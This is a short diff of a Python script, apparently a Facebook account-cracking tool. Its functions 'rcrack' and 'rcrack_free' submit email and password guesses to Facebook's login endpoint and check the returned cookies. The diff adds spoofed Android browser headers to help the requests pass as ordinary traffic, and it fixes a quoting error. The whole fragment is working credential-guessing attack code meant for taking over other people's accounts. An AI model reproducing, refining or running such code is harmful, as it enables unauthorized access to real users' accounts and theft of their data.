@@ -493,7 +493,21 @@ def rcrack_free(idf,pwv):
 			"email":idf,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {
+			header_freefb = {'authority':'free.facebook.com',
+			'method': 'GET',
+			'scheme': 'https',
+			'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+			'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'image',
+            'sec-fetch-mode': 'no-cors',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
 		    'user-agent': pro}
 			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
@@ -555,7 +569,7 @@ def rcrack(uid,pwx,tl):
 			'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
 			'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            ''cache-control': 'max-age=0',
+            'cache-control': 'max-age=0',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
